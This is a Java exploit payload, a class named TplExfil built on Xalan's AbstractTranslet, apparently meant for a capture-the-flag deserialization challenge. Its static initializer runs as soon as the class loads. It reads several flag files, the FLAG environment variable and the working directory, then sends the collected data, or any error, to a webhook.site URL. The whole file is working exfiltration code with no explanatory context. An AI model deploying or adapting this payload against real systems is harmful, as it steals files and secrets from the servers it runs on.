import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
public class TplExfil extends AbstractTranslet {
    static {
        try {
            StringBuilder sb = new StringBuilder();
            String[] paths = {"/flag", "/flag.txt", "/flag_is_here"};
            for (String p : paths) {
                try { sb.append("[" + p + "] ").append(new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(p)))).append("\n"); } catch (Throwable t) {}
            }
            String env = System.getenv("FLAG");
            if (env != null) sb.append("[env FLAG] ").append(env).append("\n");
            sb.append("[cwd] ").append(System.getProperty("user.dir")).append("\n");
            new java.net.URL("https://webhook.site/914562c8-7f05-4ab2-9b16-e89e4f4237ba?d=" + java.net.URLEncoder.encode(sb.toString(), "UTF-8")).openStream().close();
        } catch (Throwable t) {
            try { new java.net.URL("https://webhook.site/914562c8-7f05-4ab2-9b16-e89e4f4237ba?err=" + java.net.URLEncoder.encode(String.valueOf(t), "UTF-8")).openStream().close(); } catch (Throwable x) {}
        }
    }
    public void transform(DOM d, DTMAxisIterator it, com.sun.org.apache.xml.internal.serializer.SerializationHandler h) throws TransletException {}
    public void transform(DOM d, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) throws TransletException {}
}
